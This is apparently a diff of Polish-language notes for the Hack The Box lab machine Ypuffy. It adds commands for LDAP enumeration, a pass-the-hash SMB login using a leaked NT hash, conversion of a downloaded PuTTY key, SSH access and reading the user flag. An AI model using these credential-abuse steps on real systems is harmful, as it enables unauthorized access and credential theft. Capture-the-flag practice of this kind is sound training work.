@@ -66,85 +66,41 @@ ________________________________________________________________________________
 LDAP
 ________________________________________________________________________________________
 
-nmap --script "ldap-search" -p 389 10.10.10.107
+nmap --script "ldap-search" -p 389 10.10.10.107 > files/nmap_ldap_script
+ldapsearch -h 10.10.10.107 -x -b "uid=alice1978,ou=passwd,dc=hackthebox,dc=htb" -w {BSDAUTH}alice1978 > alice1978_passwd_ldap
+ldapsearch -h 10.10.10.107 -x -b "uid=bob8791,ou=passwd,dc=hackthebox,dc=htb" -w {BSDAUTH}bob8791 > bob8791_passwd_ldap
+ldapsearch -h 10.10.10.107 -x -b "cn=bob8791,ou=group,dc=hackthebox,dc=htb" -w {crypt}* > bob8791_group_ldap
+ldapsearch -h 10.10.10.107 -x -b "cn=alice1978,ou=group,dc=hackthebox,dc=htb" -w {crypt}* > alice1978_group_ldap
 
-PORT    STATE SERVICE
-389/tcp open  ldap
-| ldap-search: 
-|   Context: dc=hackthebox,dc=htb
-|     dn: dc=hackthebox,dc=htb
-|         dc: hackthebox
-|         objectClass: top
-|         objectClass: domain
-|     dn: ou=passwd,dc=hackthebox,dc=htb
-|         ou: passwd
-|         objectClass: top
-|         objectClass: organizationalUnit
-|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
-|         uid: bob8791
-|         cn: Bob
-|         objectClass: account
-|         objectClass: posixAccount
-|         objectClass: top
-|         userPassword: {BSDAUTH}bob8791
-|         uidNumber: 5001
-|         gidNumber: 5001
-|         gecos: Bob
-|         homeDirectory: /home/bob8791
-|         loginShell: /bin/ksh
-|     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
-|         uid: alice1978
-|         cn: Alice
-|         objectClass: account
-|         objectClass: posixAccount
-|         objectClass: top
-|         objectClass: sambaSamAccount
-|         userPassword: {BSDAUTH}alice1978
-|         uidNumber: 5000
-|         gidNumber: 5000
-|         gecos: Alice
-|         homeDirectory: /home/alice1978
-|         loginShell: /bin/ksh
-|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
-|         displayName: Alice
-|         sambaAcctFlags: [U          ]
-|         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
-|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
-|         sambaPwdLastSet: 1532916644
-|     dn: ou=group,dc=hackthebox,dc=htb
-|         ou: group
-|         objectClass: top
-|         objectClass: organizationalUnit
-|     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
-|         objectClass: posixGroup
-|         objectClass: top
-|         cn: bob8791
-|         userPassword: {crypt}*
-|         gidNumber: 5001
-|     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
-|         objectClass: posixGroup
-|         objectClass: top
-|         cn: alice1978
-|         userPassword: {crypt}*
-|         gidNumber: 5000
-|     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
-|         sambaDomainName: YPUFFY
-|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464
-|         sambaAlgorithmicRidBase: 1000
-|         objectclass: sambaDomain
-|         sambaNextUserRid: 1000
-|         sambaMinPwdLength: 5
-|         sambaPwdHistoryLength: 0
-|         sambaLogonToChgPwd: 0
-|         sambaMaxPwdAge: -1
-|         sambaMinPwdAge: 0
-|         sambaLockoutDuration: 30
-|         sambaLockoutObservationWindow: 30
-|         sambaLockoutThreshold: 0
-|         sambaForceLogoff: -1
-|         sambaRefuseMachinePwdChange: 0
-|_        sambaNextRid: 1001
-___________________________________________________________________________________________
+________________________________________________________________________________________
+SMB
+________________________________________________________________________________________
 
+smbclient -L 10.10.10.107 -W YPUFFY -U alice1978 --pw-nt-hash
+password: 0B186E661BBDBDCF6047784DE8B9FD8B << NIE DZIAŁA
 
+smbclient \\\\10.10.10.107\\alice -W YPUFFY -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash < DZIAŁA
 
+smb: \> dir
+  .                                   D        0  Mon Jul 30 22:54:20 2018
+  ..                                  D        0  Wed Dec 19 03:57:00 2018
+  my_private_key.ppk                  A     1460  Mon Jul 16 21:38:51 2018
+
+________________________________________________________________________________________
+
+Plik w formacie putty
+konwersja:
+    puttygen my_private_key.ppk -O private-openssh -o id_rsa
+
+_______________________________________________________________________________________
+Połączenie SSH
+_______________________________________________________________________________________
+
+ssh -i id_rsa alice1978@10.10.10.107
+
+_______________________________________________________________________________________
+USER.TXT
+_______________________________________________________________________________________
+ypuffy$ cat user.txt
+acbc06eb2982b14c2756b6c6e3767aab
+______________________________________________________________________________________
